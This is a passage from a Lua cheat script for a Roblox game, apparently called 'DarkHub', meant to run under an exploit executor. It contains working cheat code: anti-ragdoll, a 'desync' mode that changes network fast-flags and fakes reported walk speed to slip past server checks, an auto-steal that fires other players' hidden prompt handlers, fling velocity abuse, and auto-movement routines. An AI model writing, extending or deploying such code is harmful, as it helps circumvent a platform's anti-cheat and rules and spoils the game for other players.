        if (endTime - now) > 0 then return true end
    end
    return false
end

local function removeRagdollConstraints()
    if not ANTI_RAGDOLL.cachedCharData.character then return false end
    local removed = false
    for _, descendant in ipairs(ANTI_RAGDOLL.cachedCharData.character:GetDescendants()) do
        if descendant:IsA("BallSocketConstraint") or
           (descendant:IsA("Attachment") and descendant.Name:find("RagdollAttachment")) then
            pcall(function()
                descendant:Destroy()
                removed = true
            end)
        end
    end
    return removed
end

local function forceExitRagdoll()
    if not ANTI_RAGDOLL.cachedCharData.humanoid or not ANTI_RAGDOLL.cachedCharData.root then return end
    local hum = ANTI_RAGDOLL.cachedCharData.humanoid
    local root = ANTI_RAGDOLL.cachedCharData.root

    pcall(function()
        local now = workspace:GetServerTimeNow()
        LP:SetAttribute("RagdollEndTime", now)
    end)

    if hum.Health > 0 then
        hum:ChangeState(Enum.HumanoidStateType.Running)
    end

    root.Anchored = false
    root.AssemblyLinearVelocity = Vector3.zero
    root.AssemblyAngularVelocity = Vector3.zero
end

local function v1HeartbeatLoop()
    while ANTI_RAGDOLL.enabled and ANTI_RAGDOLL.cachedCharData.humanoid do
        task.wait(0.05)
        if isRagdolled() then
            removeRagdollConstraints()
            forceExitRagdoll()
        end
    end
end

local function setupCameraBinding()
    if not ANTI_RAGDOLL.cachedCharData.humanoid then return end
    local conn = RunService.RenderStepped:Connect(function()
        if not ANTI_RAGDOLL.enabled then return end
        local cam = workspace.CurrentCamera
        if cam and ANTI_RAGDOLL.cachedCharData.humanoid and cam.CameraSubject ~= ANTI_RAGDOLL.cachedCharData.humanoid then
            cam.CameraSubject = ANTI_RAGDOLL.cachedCharData.humanoid
        end
    end)
    table.insert(ANTI_RAGDOLL.connections, conn)
end

local function onCharacterAddedAntiRagdoll(char)
    task.wait(0.5)
    if not ANTI_RAGDOLL.enabled then return end
    if cacheCharacterData() then
        setupCameraBinding()
        task.spawn(v1HeartbeatLoop)
    end
end

startAntiRagdoll = function()
    State.antiRagdollEnabled = true
    if ANTI_RAGDOLL.enabled then return end

    if not cacheCharacterData() then
        return
    end

    ANTI_RAGDOLL.enabled = true
    local charConn = LP.CharacterAdded:Connect(onCharacterAddedAntiRagdoll)
    table.insert(ANTI_RAGDOLL.connections, charConn)

    setupCameraBinding()
    task.spawn(v1HeartbeatLoop)
end

stopAntiRagdoll = function()
    State.antiRagdollEnabled = false
    ANTI_RAGDOLL.enabled = false
    disconnectAllAntiRagdoll()
    ANTI_RAGDOLL.cachedCharData = {}
end

-- ─── Desync ────────────────────────────────────────────────────────────────
do
local DS = {
	active = false, conn = nil, invisiblePart = nil,
	originalWalk = nil, lastWalkWritten = nil,
	lastSnapTime = 0, postSimLastT = 0,
	linearVelocity = nil, networkRefreshConn = nil,
	savedSpeed = nil, fflagLastApplyT = 0,
	LV_MAX_FORCE = 1.2e7, VEL_SMOOTH_HZ = 4.25,
	SNAP_MIN_INTERVAL = 0.14,
	DRIVE_MIN = 20, DRIVE_MAX = 29,
	REPORT_WALK_MIN_TOUCH = 38, REPORT_WALK_MAX_TOUCH = 56,
	REPORT_PER_DRIVE_TOUCH = 1.48, REPORT_PER_DRIVE_OFF_TOUCH = 3.2,
	BYPASS_STEAL_MIN = 40, BYPASS_STEAL_MAX = 51,
}

local DESYNC_HUB_FFLAGS = {
	S2PhysicsSenderRate = 15000, DFIntConnectionMTUSize = 1400,
	DFIntRakNetResendBufferArrayLength = 128, DFIntRakNetResendTimeoutMS = 300,
	DFIntNetworkLatencyTolerance = 1, DFIntNetworkPrediction = 1,
	FFlagRakNetDisableFlowControl = true, DFFlagRakNetDisableCongestionControl = true,
	DFIntTaskSchedulerTargetFps = 29383, FFlagGameBasicSettingsFramerateCap5 = false,
	FFlagTaskSchedulerLimitTargetFpsTo2402 = false,
}

local function applyDesyncFFlags()
	local now = tick()
	if (now - DS.fflagLastApplyT) < 0.75 then return end
	DS.fflagLastApplyT = now
	if type(setfflag) ~= "function" then return end
	for name, value in pairs(DESYNC_HUB_FFLAGS) do
		pcall(function() setfflag(tostring(name), tostring(value)) end)
	end
end

local function setRaknetDesync(on)
	pcall(function() local g=(getgenv and getgenv()) or _G; local r=rawget(g,"raknet"); if type(r)=="table" and type(r.desync)=="function" then r.desync(on) end end)
	pcall(function() local g=(getgenv and getgenv()) or _G; local n=rawget(g,"network"); if type(n)=="table" and type(n.desync)=="function" then n.desync(on) end end)
	pcall(function() local g=(getgenv and getgenv()) or _G; local f=rawget(g,"fluxus"); if type(f)=="table" and type(f.network_desync)=="function" then f.network_desync(on) end end)
end

local function teardownDesyncPhys()
	if DS.conn then DS.conn:Disconnect(); DS.conn = nil end
	if DS.networkRefreshConn then DS.networkRefreshConn:Disconnect(); DS.networkRefreshConn = nil end
	pcall(function() if DS.invisiblePart then DS.invisiblePart:Destroy() end end)
	DS.invisiblePart = nil
	for _, inst in ipairs(workspace:GetChildren()) do
		if inst.Name == "DarkHub_DesyncPos" then pcall(function() inst:Destroy() end) end
	end
	local ch = LP.Character
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	if hum and DS.originalWalk ~= nil then pcall(function() hum.WalkSpeed = DS.originalWalk end) end
	DS.originalWalk = nil; DS.lastWalkWritten = nil
	DS.lastSnapTime = 0; DS.postSimLastT = 0; DS.linearVelocity = nil
end

local snapDesyncFollower
local function updateDesyncMovement(dt)
	dt = (type(dt)=="number" and dt>0 and dt<0.5) and dt or (1/60)
	local blend = math.clamp(dt * DS.VEL_SMOOTH_HZ, 0.08, 0.5)
	local function applySmoothedHorizontal(tvx, tvz)
		local cur = DS.invisiblePart.AssemblyLinearVelocity
		local v = Vector3.new(cur.X+(tvx-cur.X)*blend, cur.Y, cur.Z+(tvz-cur.Z)*blend)
		if DS.linearVelocity and DS.linearVelocity.Parent then DS.linearVelocity.VectorVelocity = v
		else DS.invisiblePart.AssemblyLinearVelocity = v end
	end
	if not DS.active or not DS.invisiblePart or not DS.invisiblePart.Parent then return end
	local char = LP.Character
	if not char or DS.invisiblePart.Parent ~= char then return end
	local humanoid = char:FindFirstChildOfClass("Humanoid")
	local hrp2 = char:FindFirstChild("HumanoidRootPart")
	if not humanoid or not hrp2 then return end
	if humanoid.Health <= 0 then
		local zv = Vector3.new(0, DS.invisiblePart.AssemblyLinearVelocity.Y, 0)
		if DS.linearVelocity and DS.linearVelocity.Parent then DS.linearVelocity.VectorVelocity = zv
		else DS.invisiblePart.AssemblyLinearVelocity = zv end
		return
	end
	local moveDir = humanoid.MoveDirection
	local moving = moveDir.Magnitude > 0.02
	local driveUnit = moving and moveDir.Unit or nil
	local orig = math.clamp(DS.originalWalk or 16, 6, 34)
	local t2 = math.clamp((orig-6)/28, 0, 1)
	local driveS = DS.DRIVE_MIN + t2*(DS.DRIVE_MAX-DS.DRIVE_MIN)
	local reportW = math.clamp(driveS*DS.REPORT_PER_DRIVE_TOUCH+DS.REPORT_PER_DRIVE_OFF_TOUCH, DS.REPORT_WALK_MIN_TOUCH, DS.REPORT_WALK_MAX_TOUCH)
	if State.isStealing then driveS = math.clamp(30, DS.BYPASS_STEAL_MIN, DS.BYPASS_STEAL_MAX); reportW = driveS end
	if moving then
		if DS.lastWalkWritten==nil or math.abs(DS.lastWalkWritten-reportW)>0.28 then pcall(function() humanoid.WalkSpeed=reportW end); DS.lastWalkWritten=reportW end
		applySmoothedHorizontal(driveUnit.X*driveS, driveUnit.Z*driveS)
	else
		if DS.lastWalkWritten==nil or math.abs(DS.lastWalkWritten-reportW)>0.35 then pcall(function() humanoid.WalkSpeed=reportW end); DS.lastWalkWritten=reportW end
		applySmoothedHorizontal(0, 0)
	end
end

snapDesyncFollower = function()
	if not DS.active or not DS.invisiblePart or not DS.invisiblePart.Parent then return end
	local c = LP.Character
	if not c or DS.invisiblePart.Parent ~= c then return end
	local hrp2 = c:FindFirstChild("HumanoidRootPart"); if not hrp2 then return end
	local now = tick()
	if DS.lastSnapTime>0 and (now-DS.lastSnapTime)<DS.SNAP_MIN_INTERVAL then return end
	DS.lastSnapTime = now
	DS.invisiblePart.CFrame = hrp2.CFrame * CFrame.new(0,0,-2.85)
end

local function setupDesyncCharacter(char)
	teardownDesyncPhys()
	if not DS.active then return end
	local humanoid = char:WaitForChild("Humanoid",15)
	local hrp2 = char:WaitForChild("HumanoidRootPart",15)
	if not humanoid or not hrp2 then return end
	DS.originalWalk = humanoid.WalkSpeed; DS.lastWalkWritten = nil; DS.linearVelocity = nil
	DS.invisiblePart = Instance.new("Part")
	DS.invisiblePart.Name = "DarkHub_DesyncFollower"
	DS.invisiblePart.Size = Vector3.new(2,1,2)
	DS.invisiblePart.Transparency = 1; DS.invisiblePart.CanCollide = false
	DS.invisiblePart.Anchored = false; DS.invisiblePart.Massless = true
	DS.invisiblePart.Parent = char
	local dhAtt = Instance.new("Attachment"); dhAtt.Name = "DH_DesyncDrive"; dhAtt.Parent = DS.invisiblePart
	local lv = Instance.new("LinearVelocity"); lv.Name = "DH_DesyncLinearVelocity"
	lv.Attachment0 = dhAtt; lv.RelativeTo = Enum.ActivationRelativeTo.World
	lv.MaxForce = DS.LV_MAX_FORCE; lv.VectorVelocity = Vector3.zero; lv.Parent = DS.invisiblePart
	DS.linearVelocity = lv
	local welded = false
	pcall(function()
		local w = Instance.new("Weld"); w.Name = "DH_DesyncWeld"
		w.Part0 = hrp2; w.Part1 = DS.invisiblePart; w.C0 = CFrame.new(0,0,-3.85); w.Parent = DS.invisiblePart
		welded = true
	end)
	if not welded then
		DS.invisiblePart.CFrame = hrp2.CFrame * CFrame.new(0,0,-3.85)
		local wc = Instance.new("WeldConstraint"); wc.Name = "DH_DesyncWeldConstraint"
		wc.Part0 = hrp2; wc.Part1 = DS.invisiblePart; wc.Parent = DS.invisiblePart
	end
	task.defer(function() DS.lastSnapTime=0; snapDesyncFollower(); RunService.Heartbeat:Wait(); snapDesyncFollower() end)
	task.delay(0.15, snapDesyncFollower)
	DS.postSimLastT = os.clock()
	local stepper = RunService.PostSimulation or RunService.Heartbeat
	DS.conn = stepper:Connect(function()
		local now = os.clock(); local dt = math.clamp(now-DS.postSimLastT, 1/240, 1/25)
		DS.postSimLastT = now; updateDesyncMovement(dt)
	end)
	local refreshAccum = 0
	DS.networkRefreshConn = RunService.Heartbeat:Connect(function(dt)
		if not DS.active then return end
		refreshAccum += (type(dt)=="number" and dt or 1/60)
		if refreshAccum < 1.2 then return end
		refreshAccum = 0
		if DS.active then DS.fflagLastApplyT=0; applyDesyncFFlags() end
	end)
	DS.fflagLastApplyT = 0; applyDesyncFFlags()
	task.delay(0.45, function() if DS.active then DS.fflagLastApplyT=0; applyDesyncFFlags() end end)
	task.delay(1.35, function() if DS.active then DS.fflagLastApplyT=0; applyDesyncFFlags() end end)
end

stopDesyncSession = function()
	setRaknetDesync(false); DS.active = false; teardownDesyncPhys(); DS.savedSpeed = nil
	State.desyncEnabled = false
end

startDesyncSession = function()
	if DS.active then return end
	teardownDesyncPhys(); DS.savedSpeed = nil; DS.fflagLastApplyT = 0
	applyDesyncFFlags(); setRaknetDesync(true); DS.active = true
	State.desyncEnabled = true
	task.spawn(function()
		pcall(function() LP:LoadCharacter() end)
		for _, delay in ipairs({0.12, 0.45, 1.2}) do
			task.wait(delay)
			if not DS.active then return end
			local ch = LP.Character
			if ch and (not DS.invisiblePart or not DS.invisiblePart.Parent) then
				setupDesyncCharacter(ch)
				if DS.invisiblePart and DS.invisiblePart.Parent then break end
			end
		end
		task.wait(3.5)
		if not DS.active then return end
		local ch = LP.Character
		if ch and (not DS.invisiblePart or not DS.invisiblePart.Parent) then setupDesyncCharacter(ch) end
	end)
end

LP.CharacterAdded:Connect(function(char)
	if DS.active then
		DS.fflagLastApplyT = 0; applyDesyncFFlags()
		task.delay(0.45, function()
			if DS.active and LP.Character==char then DS.fflagLastApplyT=0; applyDesyncFFlags() end
		end)
		task.defer(function()
			setupDesyncCharacter(char)
			if DS.active and (not DS.invisiblePart or not DS.invisiblePart.Parent) then
				task.delay(0.35, function()
					if DS.active and LP.Character==char then setupDesyncCharacter(LP.Character) end
				end)
			end
		end)
	end
end)
end
-- ─── End of Desync ────────────────────────────────────────────────────────────

-- ============================================================
-- AUTO STEAL LOGIC (Completo, sin cambios)
-- ============================================================
;(function()

local _isfile   = isfile   or (syn and syn.isfile)   or (getgenv and getgenv().isfile)   or function() return false end
local _readfile = readfile  or (syn and syn.readfile)  or (getgenv and getgenv().readfile)  or function() return nil  end
local _writefile= writefile or (syn and syn.writefile) or (getgenv and getgenv().writefile) or function() end
local getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)

local MOVE_KEYS={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true,
    [Enum.KeyCode.Up]=true,[Enum.KeyCode.Left]=true,[Enum.KeyCode.Down]=true,[Enum.KeyCode.Right]=true}
local PLOT_CACHE_DURATION=2; local PROMPT_CACHE_REFRESH=0.15
local STEAL_COOLDOWN=0.1; local MEDUSA_COOLDOWN=25; local DROP_AUTO_OFF_DELAY=0.15
local CONFIG_FILE="KSKOPConfig.json"

State.autoLeftPhase=1; State.autoRightPhase=1
State.medusaLastUsed=0; State.medusaDebounce=false; State.medusaCounterEnabled=false
State.batAimbotToggled=false; State.autoSwingEnabled=false
State.hittingCooldown=false
State.batCounterEnabled=false; State.batCounterDebounce=false
State.dropEnabled=false; State._tpInProgress=false
State.lastMoveDir=Vector3.new(0,0,0)
State._prevCarry=CS; State._prevSpeed=false
State.laggerEnabled=false

Conns.autoLeft=nil; Conns.autoRight=nil; Conns.aimbot=nil
Conns.batCounter=nil; Conns.unwalk=nil

local Presets={}
local PRESET_FILE="KSKOPPresets.json"; local LAST_PRESET_FILE="KSKOPLastPreset.json"
local function buildPresetSnapshot()
    return {normalSpeed=NS,carrySpeed=CS,laggerSpeed=LS,stealRadius=Steal.StealRadius,
        infJump=State.infJumpEnabled,
		holdJump=State.holdJumpEnabled,
        antiRagdoll=State.antiRagdollEnabled,fpsBoost=State.fpsBoostEnabled,
        medusaCounter=State.medusaCounterEnabled,batCounter=State.batCounterEnabled,
        autoSteal=Steal.AutoStealEnabled,uiScale=uiScaleValue}
end
local function savePresetsFile()
    local ok,enc=pcall(function() return HttpService:JSONEncode(Presets) end)
    if ok then pcall(function() _writefile(PRESET_FILE,enc) end) end
end
local function loadPresetsFile()
    local hasFile=false; pcall(function() hasFile=_isfile(PRESET_FILE) end)
    if not hasFile then return end
    local raw; pcall(function() raw=_readfile(PRESET_FILE) end)
    if not raw then return end
    local ok,dec=pcall(function() return HttpService:JSONDecode(raw) end)
    if ok and dec then Presets=dec end
end
local function saveLastPresetName(name)
    local ok,enc=pcall(function() return HttpService:JSONEncode({lastPreset=name}) end)
    if ok then pcall(function() _writefile(LAST_PRESET_FILE,enc) end) end
end
local function loadLastPresetName()
    local hasFile=false; pcall(function() hasFile=_isfile(LAST_PRESET_FILE) end)
    if not hasFile then return nil end
    local raw; pcall(function() raw=_readfile(LAST_PRESET_FILE) end)
    if not raw then return nil end
    local ok,dec=pcall(function() return HttpService:JSONDecode(raw) end)
    if ok and dec then return dec.lastPreset end; return nil
end

local setAutoSwingVisual
local function doTpDown()
    pcall(function()
        local c=LP.Character; if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart"); if not root then return end
        local rp=RaycastParams.new(); rp.FilterDescendantsInstances={c}; rp.FilterType=Enum.RaycastFilterType.Exclude
        local res=workspace:Raycast(root.Position,Vector3.new(0,-1000,0),rp)
        if res then root.CFrame=CFrame.new(res.Position+Vector3.new(0,root.Size.Y/2+0.5,0)); root.AssemblyLinearVelocity=Vector3.zero end
    end)
end

local _dropConns={}
local function runDropBrainrot()
    if State.dropEnabled then return end; State.dropEnabled=true
    task.spawn(function()
        local colConn=RunService.Stepped:Connect(function()
            if not State.dropEnabled then return end
            for _,p in ipairs(Players:GetPlayers()) do
                if p~=LP and p.Character then
                    for _,part in ipairs(p.Character:GetChildren()) do if part:IsA("BasePart") then part.CanCollide=false end end
                end
            end
        end)
        table.insert(_dropConns,colConn)
        task.spawn(function()
            while State.dropEnabled do
                RunService.Heartbeat:Wait()
                local c=LP.Character; local root=c and c:FindFirstChild("HumanoidRootPart")
                if not root then break end
                local vel=root.Velocity; root.Velocity=vel*10000+Vector3.new(0,10000,0)
                RunService.RenderStepped:Wait(); if root and root.Parent then root.Velocity=vel end
                RunService.Stepped:Wait(); if root and root.Parent then root.Velocity=vel+Vector3.new(0,0.1,0) end
            end
        end)
        task.wait(DROP_AUTO_OFF_DELAY); State.dropEnabled=false
        for _,cn in ipairs(_dropConns) do pcall(function() cn:Disconnect() end) end; _dropConns={}
    end)
end

local BAT_COUNTER_SLAP_LIST={"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
local function findBatForCounter()
    local c=LP.Character; if not c then return nil end
    local bp=LP:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(BAT_COUNTER_SLAP_LIST) do
        local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name)); if t then return t end
    end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end
local function swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end; task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer() end); task.wait(0.15); pcall(function() remote:FireServer() end)
    else pcall(function() bat:Activate() end); task.wait(0.15); pcall(function() bat:Activate() end) end
end
local function startBatCounter()
    if Conns.batCounter then return end
    Conns.batCounter=RunService.Heartbeat:Connect(function()
        if not State.batCounterEnabled then return end
        if State.batCounterDebounce then return end
        local char=LP.Character; if not char then return end
        local hum2=char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
        local st=hum2:GetState()
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            State.batCounterDebounce=true
            task.spawn(function()
                local bat=findBatForCounter()
                if bat then swingBatForCounter(bat,char) end
                task.wait(0.5); State.batCounterDebounce=false
            end)
        end
    end)
end
local function stopBatCounter()
    if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter=nil end
    State.batCounterDebounce=false
end

local function findMedusa()
    local c=LP.Character; if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=LP:FindFirstChild("Backpack")
    if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end
local function useMedusaCounter()
    if State.medusaDebounce then return end; if tick()-State.medusaLastUsed<MEDUSA_COOLDOWN then return end
    local c=LP.Character; if not c then return end; State.medusaDebounce=true
    local med=findMedusa(); if not med then State.medusaDebounce=false; return end
    if med.Parent~=c then local hum2=c:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:EquipTool(med) end end
    pcall(function() med:Activate() end); State.medusaLastUsed=tick(); State.medusaDebounce=false
end
local function onAnchorChanged(part) return part:GetPropertyChangedSignal("Anchored"):Connect(function() if part.Anchored and part.Transparency==1 then useMedusaCounter() end end) end
local function setupMedusaCounter(char)
    for _,c2 in pairs(Conns.anchor) do pcall(function() c2:Disconnect() end) end; Conns.anchor={}
    if not char then return end
    for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end end
    table.insert(Conns.anchor,char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end end))
end
local function stopMedusaCounter() for _,c2 in pairs(Conns.anchor) do pcall(function() c2:Disconnect() end) end; Conns.anchor={} end

local function faceSouth() pcall(function() local c=LP.Character; if not c then return end; local root=c:FindFirstChild("HumanoidRootPart"); if root then root.CFrame=CFrame.new(root.Position)*CFrame.Angles(0,0,0) end end) end
local function faceNorth() pcall(function() local c=LP.Character; if not c then return end; local root=c:FindFirstChild("HumanoidRootPart"); if root then root.CFrame=CFrame.new(root.Position)*CFrame.Angles(0,math.rad(180),0) end end) end

local function startAutoLeft()
    if Conns.autoLeft then Conns.autoLeft:Disconnect() end; State.autoLeftPhase=1
    Conns.autoLeft=RunService.Heartbeat:Connect(function()
        if not State.autoLeftEnabled then return end
        local c=LP.Character; if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart"); local hum2=c:FindFirstChildOfClass("Humanoid"); if not root or not hum2 then return end
        local spd=NS
        if State.autoLeftPhase==1 then
            local tgt=Vector3.new(AP.L1.X,root.Position.Y,AP.L1.Z); if (tgt-root.Position).Magnitude<1 then State.autoLeftPhase=2; local d=(AP.L2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd); return end
            local d=(AP.L1-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        elseif State.autoLeftPhase==2 then
            local tgt=Vector3.new(AP.L2.X,root.Position.Y,AP.L2.Z); if (tgt-root.Position).Magnitude<1 then hum2:Move(Vector3.zero,false); root.AssemblyLinearVelocity=Vector3.zero; State.autoLeftEnabled=false; if Conns.autoLeft then Conns.autoLeft:Disconnect(); Conns.autoLeft=nil end; State.autoLeftPhase=1; if autoLeftSetVisual then autoLeftSetVisual(false) end; faceSouth(); return end
            local d=(AP.L2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        end
    end)
end
local function stopAutoLeft()
    if Conns.autoLeft then Conns.autoLeft:Disconnect(); Conns.autoLeft=nil end; State.autoLeftPhase=1
    local c=LP.Character; if c then local hum2=c:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:Move(Vector3.zero,false) end end
end
local function startAutoRight()
    if Conns.autoRight then Conns.autoRight:Disconnect() end; State.autoRightPhase=1
    Conns.autoRight=RunService.Heartbeat:Connect(function()
        if not State.autoRightEnabled then return end
        local c=LP.Character; if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart"); local hum2=c:FindFirstChildOfClass("Humanoid"); if not root or not hum2 then return end
        local spd=NS
        if State.autoRightPhase==1 then
            local tgt=Vector3.new(AP.R1.X,root.Position.Y,AP.R1.Z); if (tgt-root.Position).Magnitude<1 then State.autoRightPhase=2; local d=(AP.R2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd); return end
            local d=(AP.R1-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        elseif State.autoRightPhase==2 then
            local tgt=Vector3.new(AP.R2.X,root.Position.Y,AP.R2.Z); if (tgt-root.Position).Magnitude<1 then hum2:Move(Vector3.zero,false); root.AssemblyLinearVelocity=Vector3.zero; State.autoRightEnabled=false; if Conns.autoRight then Conns.autoRight:Disconnect(); Conns.autoRight=nil end; State.autoRightPhase=1; if autoRightSetVisual then autoRightSetVisual(false) end; faceNorth(); return end
            local d=(AP.R2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        end
    end)
end
local function stopAutoRight()
    if Conns.autoRight then Conns.autoRight:Disconnect(); Conns.autoRight=nil end; State.autoRightPhase=1
    local c=LP.Character; if c then local hum2=c:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:Move(Vector3.zero,false) end end
end

-- startAntiRagdoll y stopAntiRagdoll están definidos arriba

local applyFPSBoost
applyFPSBoost=function()
    pcall(function() setfpscap(999999999) end)
    local function pO(v) pcall(function()
        if v:IsA("Model") then v.LevelOfDetail=Enum.ModelLevelOfDetail.Disabled; v.ModelStreamingMode=Enum.ModelStreamingMode.Nonatomic
        elseif v:IsA("MeshPart") then v.CastShadow=false; v.DoubleSided=false; v.RenderFidelity=Enum.RenderFidelity.Performance
        elseif v:IsA("BasePart") then v.CastShadow=false; v.Material=Enum.Material.Plastic; v.Reflectance=0
        elseif v:IsA("Decal") or v:IsA("Texture") then v.Transparency=1
        elseif v:IsA("SpecialMesh") then v.TextureId=""
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then v.Enabled=false
        elseif v:IsA("SurfaceAppearance") or v:IsA("MaterialVariant") then v:Destroy()
        elseif v:IsA("Attachment") then v.Visible=false end
    end) end
    for _,v in pairs(workspace:GetDescendants()) do pO(v) end
    pcall(function()
        local L=game:GetService("Lighting")
        for _,v in pairs(L:GetDescendants()) do pcall(function() if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Clouds") or v:IsA("PostEffect") or v:IsA("ColorCorrectionEffect") then v:Destroy() end end) end
        pcall(function() sethiddenproperty(L,"Technology",Enum.Technology.Legacy) end)
        L.GlobalShadows=false; L.FogEnd=9e9; L.Brightness=0
        local ter=workspace:FindFirstChildOfClass("Terrain")
        if ter then pcall(function() sethiddenproperty(ter,"Decoration",false) end); ter.WaterReflectance=0; ter.WaterTransparency=0.7; ter.WaterWaveSize=0; ter.WaterWaveSpeed=0 end
    end)
    workspace.DescendantAdded:Connect(function(v) if State.fpsBoostEnabled then task.spawn(pO,v) end end)
end

-- ============================================================
-- ══ AUTO STEAL (Completo) ══
-- ============================================================

local function getHRP()
    local c = LP.Character
    if c then return c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso") end
    return nil
end

local function isMyPlotByName(pn)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(pn)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end

local function findNearestPrompt()
    local hrp = getHRP()
    if not hrp then return nil end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local nearest, dist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        if isMyPlotByName(plot.Name) then continue end
        local pods = plot:FindFirstChild("AnimalPodiums")
        if not pods then continue end
        for _, pod in ipairs(pods:GetChildren()) do
            local base = pod:FindFirstChild("Base")
            if not base then continue end
            local spawn = base:FindFirstChild("Spawn")
            if not spawn then continue end
            local d = (spawn.Position - hrp.Position).Magnitude
            if d <= Steal.StealRadius and d < dist then
                local att = spawn:FindFirstChild("PromptAttachment")
                if att then
                    for _, p in ipairs(att:GetChildren()) do
                        if p:IsA("ProximityPrompt") and p.ActionText and p.ActionText:find("Steal") then
                            nearest, dist = p, d
                        end
                    end
                end
            end
        end
    end
    return nearest
end

local function executeSteal(prompt)
    if State.isStealing then return end
    if not Steal.Data[prompt] then
        Steal.Data[prompt] = {hold = {}, trigger = {}, ready = true}
        if getconnections then
            for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                if c.Function then table.insert(Steal.Data[prompt].hold, c.Function) end
            end
            for _, c in ipairs(getconnections(prompt.Triggered)) do
                if c.Function then table.insert(Steal.Data[prompt].trigger, c.Function) end
            end
        end
    end
    local data = Steal.Data[prompt]
    if not data.ready then return end
    data.ready = false
    State.isStealing = true
    State.stealStartTime = tick()
    task.spawn(function()
        for _, f in ipairs(data.hold) do pcall(f) end
        while tick() - State.stealStartTime < Steal.StealDuration do
            task.wait()
        end
        for _, f in ipairs(data.trigger) do pcall(f) end
        task.wait(0.05)
        data.ready = true
        State.isStealing = false
    end)
end

function startAutoSteal()
    if Conns.autoSteal then return end
    Conns.autoSteal = RunService.Heartbeat:Connect(function()
        if State.isStealing then return end
        local success, prompt = pcall(findNearestPrompt)
        if success and prompt then pcall(executeSteal, prompt) end
    end)
end

function stopAutoSteal()
    if Conns.autoSteal then
        Conns.autoSteal:Disconnect()
        Conns.autoSteal = nil
    end
    State.isStealing = false
end

-- ============================================================
-- FIN AUTO STEAL
-- ============================================================

saveConfig=function(btn)
    local function ks(e) return {kb=e.kb and e.kb.Name or nil,gp=e.gp and e.gp.Name or nil} end
    local function sp(f) if not f then return nil end; local p=f.Position; return {xs=p.X.Scale,xo=p.X.Offset,ys=p.Y.Scale,yo=p.Y.Offset} end
    local cfg={
        normalSpeed=NS,carrySpeed=CS,laggerSpeed=LS,laggerCarrySpeed=LS2,
        stealRadius=Steal.StealRadius,
        uiScale=uiScaleValue,
        uiLocked=uiLocked,
        autoLeftKey=ks(KB.AutoLeft),autoRightKey=ks(KB.AutoRight),
